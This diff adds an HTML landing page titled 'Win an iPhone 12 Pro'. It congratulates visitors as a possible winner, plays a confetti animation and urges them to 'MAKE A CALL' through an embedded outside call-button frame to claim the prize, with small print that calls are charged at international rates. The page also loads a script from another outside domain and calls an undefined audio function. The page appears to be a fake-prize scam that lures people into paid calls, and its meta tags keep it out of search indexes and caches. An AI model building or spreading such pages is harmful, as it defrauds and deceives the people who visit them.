@@ -1,0 +1,391 @@
+
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Win an iPhone 12 Pro</title>
+    <meta name="description" content="Win an iPhone 12 Pro">
+    <meta name="keywords" content="Win an iPhone 12 Pro">
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+
+    <meta name="robots" content="noindex" />
+    <meta name="googlebot" content="noarchive" />
+    <meta name="googlebot-news" content="nosnippet" />
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+
+    <link rel="shortcut icon" href="https://lonozoxel.xyz/groupds/assets/img/favicon.png">
+
+
+    <style>
+        /* Reset CSS
+ * --------------------------------------- */
+        body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,
+        form,fieldset,input,textarea,p,blockquote,th,td {
+            padding: 0;
+            margin: 0;
+        }
+
+        body{
+            max-width: 414px;
+            margin: 0 auto;
+            position: relative;
+            min-height: 100vh;
+            background-size: 100% 100%;
+        }
+
+        @font-face {
+            font-family: "cocogoose";
+            src: url("Cocogoose_trial.ttf") format("truetype");
+        }
+
+        #footer{
+            width: 100%;
+            background-color: transparent;
+            padding: 5px 0;
+            text-align: center;
+            position: absolute;
+            bottom: 1px;
+            left: 0;
+        }
+
+        #footer span, #footer a{
+            color: #3B3B3B;
+            display: inline-block;
+            font-family: "cocogoose";
+            font-size: 10px;
+            text-decoration: none;
+        }
+        #footer p {
+            font-size:12px;
+        }
+        #main-content{
+            text-align: center;
+            width: 100%;
+            height: 100vh;
+            background: url("background.png");
+            background-size: 100% 100%;
+            z-index: -20;
+        }
+
+        h1 {
+            font-family: "cocogoose";
+            color: #3B3B3B;
+            font-size: 26px;
+            padding-top: 15px;
+            line-height: 28px;
+            margin-bottom: 0;
+        }
+
+        button {
+            width: 90%;
+            margin: 10px auto;
+            background-color: #38DC6F;
+            height: 50px;
+            font-size: 22px;
+            font-family: "cocogoose";
+            border-radius: 5px;
+            color: #FFF;
+            border: none;
+            cursor: pointer;
+            animation: pulse 1s infinite;
+        }
+
+        #prize{
+            width: 32%;
+            padding: 0 38px;
+        }
+
+        #particle-canvas {
+            display: block;
+            position: fixed;
+            pointer-events: none;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(0.95);
+            }
+
+            70% {
+                transform: scale(1);
+            }
+
+            100% {
+                transform: scale(0.95);
+            }
+        }
+
+        * #particle-canvas, *:before #particle-canvas, *:after #particle-canvas {
+            display: block;
+            position: fixed;
+            pointer-events: none;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        #content{
+            width: 100%;
+            height: 100vh;
+            position: absolute;
+            left: 0;
+            top: 0;
+            z-index: 10;
+        }
+
+        #winner_cont{
+            width: 84%;
+            margin-left: 8%;
+            background: url('winner-header.png');
+            padding: 15px 0;
+            background-size: 100% 100%;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        #winner_cont h1{
+            color: white;
+            font-size: 32px;
+            margin: 0 !important;
+            padding: 0;
+        }
+        
+        #logo{
+            margin: 4px auto;
+        }
+
+        #cont_checkbox{
+            width: 100%;
+            display: block;
+            justify-content: center;
+            align-items: center;
+            padding: 4px 0;
+            margin-top: 4px;
+        }
+        #cont_checkbox p{
+            color: green;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .disclaimer {
+            font-family: cocogoose;
+            font-size: 11px;
+            color: #333;
+            margin: 5px 0 -10px 0;
+        }
+
+        #iframe_call_msg{
+            font-family: cocogoose;
+            font-size: 11px !important;
+            color: #333;
+            margin: 5px auto 10px auto;
+            width: 95%;
+        }
+
+    </style>
+
+</head>
+<body>
+    <div id="main-content">
+
+        <div id="content">
+            <h1>CONGRATULATIONS</h1>
+
+            <p class="disclaimer">You may be the</p>
+
+            <div id="winner_cont">
+                <h1>WINNER!</h1>
+            </div>
+
+            <img src="logo.png" alt="Prize" id="logo">
+
+            <img src="iphone.gif" alt="Prize" id="prize">
+
+            <br style="clear:left;"><br/>
+            <div id="cont_checkbox">
+<!--                <img src="groupds/--><!--checkbox.png" alt="Checkbox" id="checkbox_img" style="align:left;">-->
+                <p dir="ltr" id="iframe_call_msg">
+                    Select operator and MAKE A CALL to claim your prize                </p>
+            </div>
+
+            <iframe id="iframe_call_button"
+                    title="Inline Frame"
+                    width="300"
+                    height="180"
+                    frameborder="0"
+                    allowtransparency="true"
+                    sandbox="allow-scripts allow-top-navigation allow-same-origin"
+                    src="https://1261889cef43.tc-link.net/?p=17470&wid=123792&wid_hmac=b729049211aa827affabb39373a87743&bg-color=FFFFFF&btn-color=008000&click_id=5002102924286916&country=US&operator=">
+            </iframe>
+
+            <div id="footer">
+                <p>Calls are charged at standard international rates</p>
+                <a href="terms">Terms & Conditions</a>
+                <a href="privacy">Privacy Policy</a>
+            </div>
+
+        </div>
+<script async src="https://zink.tips/zwc.js?rid=6341dbebd38c12e2b604be2b&c=green"></script>
+      <h6>MADE BY GAMES FREE ???</h6>
+
+    </div>
+
+<script>
+    /**
+     * Confetti particle class
+     */
+    class ConfettiParticle {
+
+        constructor( context, width, height ) {
+            this.context = context;
+            this.width = width;
+            this.height = height;
+            this.color = '';
+            this.lightness = 50;
+            this.diameter = 0;
+            this.tilt = 0;
+            this.tiltAngleIncrement = 0;
+            this.tiltAngle = 0;
+            this.particleSpeed = 1;
+            this.waveAngle = 0;
+            this.x = 0;
+            this.y = 0;
+            this.reset();
+        }
+
+        reset() {
+            this.lightness = 50;
+            this.color = Math.floor( Math.random() * 360 );
+            this.x = Math.random() * this.width;
+            this.y = Math.random() * this.height - this.height;
+            this.diameter = Math.random() * 6 + 4;
+            this.tilt = 0;
+            this.tiltAngleIncrement = Math.random() * 0.1 + 0.04;
+            this.tiltAngle = 0;
+        }
+
+        darken() {
+            if ( this.y < 100 || this.lightness <= 0 ) return;
+            this.lightness -= ( 250 / this.height );
+        }
+
+        update() {
+            this.waveAngle += this.tiltAngleIncrement;
+            this.tiltAngle += this.tiltAngleIncrement;
+            this.tilt = Math.sin( this.tiltAngle ) * 12;
+            this.x += Math.sin( this.waveAngle );
+            this.y += ( Math.cos( this.waveAngle ) + this.diameter + this.particleSpeed ) * 0.4;
+            if ( this.complete() ) this.reset();
+            this.darken();
+        }
+
+        complete() {
+            return ( this.y > this.height + 20 );
+        }
+
+        draw() {
+            let x = this.x + this.tilt;
+            this.context.beginPath();
+            this.context.lineWidth = this.diameter;
+            this.context.strokeStyle = "hsl("+ this.color +", 50%, "+this.lightness+"%)";
+            this.context.moveTo( x + this.diameter / 2, this.y );
+            this.context.lineTo( x, this.y + this.tilt + this.diameter / 2 );
+            this.context.stroke();
+        }
+    }
+
+    /**
+     * Setup
+     */
+    (function() {
+        let width = window.innerWidth;
+        let height = window.innerHeight;
+        let particles = [];
+
+        // particle canvas
+        const canvas = document.createElement( 'canvas' );
+        const context = canvas.getContext( '2d' );
+        canvas.id = 'particle-canvas';
+        canvas.width = width;
+        canvas.height = height;
+        document.body.appendChild( canvas );
+
+        // change body bg color
+        const changeBgColor = () => {
+            const hue = Math.floor( Math.random() * 360 );
+            document.body.style.backgroundColor = "hsl("+ hue +", 50%, 5%)";
+        };
+
+        // update canvas size
+        const updateSize = () => {
+            width = window.innerWidth;
+            height = window.innerHeight;
+            canvas.width = width;
+            canvas.height = height;
+        };
+
+        // create confetti particles
+        const createParticles = () => {
+            particles = [];
+            let total = 100;
+
+            if ( width > 1080 ) { total = 400; } else
+            if ( width > 760 )  { total = 300; } else
+            if ( width > 520 )  { total = 200; }
+
+            for ( let i = 0; i < total; ++i ) {
+                particles.push( new ConfettiParticle( context, width, height ) );
+            }
+        };
+
+        // animation loop function
+        const animationFunc = () => {
+            requestAnimationFrame( animationFunc );
+            if ( Math.random() > 0.98 ) changeBgColor();
+            context.clearRect( 0, 0, width, height );
+
+            for ( let p of particles ) {
+                p.width = width;
+                p.height = height;
+                p.update();
+                p.draw();
+            }
+        };
+
+        // on resize
+        window.addEventListener( 'resize', e => {
+            updateSize();
+        createParticles();
+    });
+
+    // start
+    updateSize();
+    createParticles();
+    changeBgColor();
+    animationFunc();
+
+    // setup audio
+    const aos = new AmpedOutStream();
+    aos.play();
+    })();
+
+</script>
+
+</body>
+
+</html>
